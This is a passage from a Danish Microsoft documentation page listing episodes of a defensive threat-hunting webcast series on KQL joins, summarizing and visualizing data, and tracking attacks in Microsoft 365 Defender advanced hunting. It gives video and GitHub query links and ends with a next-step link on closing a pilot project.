|Episode 2: Joins|Vi vil fortsat lære om data i avanceret jagt, og hvordan man sammen samler tabeller. Få mere at vide om indre, ydre, entydige og semi-joinforbindelse og nuancerne i standard Kusto innerunique-joinforbindelse.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Episode 2: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Episode 3: Opsummering, pivotering og visualisering af data|Nu, hvor vi kan filtrere, redigere og sammenkryde data, er det tid til at opsummere, sætte tal på, pivotere og visualisere. I denne episode kommer vi til at dække summeringsoperatoren og nogle af de beregninger, du kan udføre, mens du dykker ned i flere tabeller i det avancerede jagtskema. Vi omdanner vores datasæt til diagrammer, som kan være med til at forbedre analyserne.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Episode 3: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|Episode 4: Lad os lede! Anvendelse af KQL til hændelsessporing|Tid til at spore hackeraktivitet! I denne episode vil vi bruge vores forbedrede forståelse af KQL og avanceret jagt på Microsoft 365 Defender til at spore et angreb. Lær nogle af de tip og tricks, der bruges i feltet til at spore hackeraktivitet, herunder cybersikkerheds-abcs, og hvordan du anvender dem til hændelsesrespons.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Episode 4: CSL-fil i Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Næste trin

|![Afslutnings- og opsummeringsfase](../../media/mtp/close.png) <br>[Afslutnings- og opsummeringsfase](m365d-pilot-close.md)|Analysér Microsoft 365 Defender et pilotprojekt, præsenter dem for dine interessenter, og tag det næste skridt.
|:-----|:-----|
